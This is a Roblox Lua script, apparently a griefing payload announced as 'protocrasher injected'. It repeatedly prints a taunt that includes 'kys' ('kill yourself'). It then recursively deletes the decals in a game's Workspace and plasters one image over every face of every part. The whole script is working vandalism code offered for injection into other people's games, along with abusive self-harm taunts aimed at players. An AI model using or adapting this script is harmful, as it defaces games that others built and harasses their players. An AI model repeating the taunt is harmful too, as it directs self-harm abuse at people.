print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

print("protocrasher injected u noob kys wtf")

function exPro(root)
	for _, v in pairs(root:GetChildren()) do
		if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset?id=59362874" then
			v.Parent = nil
		elseif v:IsA("BasePart") then
			--v.Material = "Plastic"
			--v.Transparency = .5
			One = Instance.new("Decal", v)
			Two = Instance.new("Decal", v)
			Three = Instance.new("Decal", v)
			Four = Instance.new("Decal", v)
			Five = Instance.new("Decal", v)
			Six = Instance.new("Decal", v)
			One.Texture = "http://www.roblox.com/asset?id=59362874"
			Two.Texture = "http://www.roblox.com/asset?id=59362874"
			Three.Texture = "http://www.roblox.com/asset?id=59362874"
			Four.Texture = "http://www.roblox.com/asset?id=59362874"
			Five.Texture = "http://www.roblox.com/asset?id=59362874"
			Six.Texture = "http://www.roblox.com/asset?id=59362874"
			One.Face = "Front"
			Two.Face = "Back"
			Three.Face = "Right"
			Four.Face = "Left"
			Five.Face = "Top"
			Six.Face = "Bottom"
		end
		exPro(v)
	end
end
exPro(Workspace)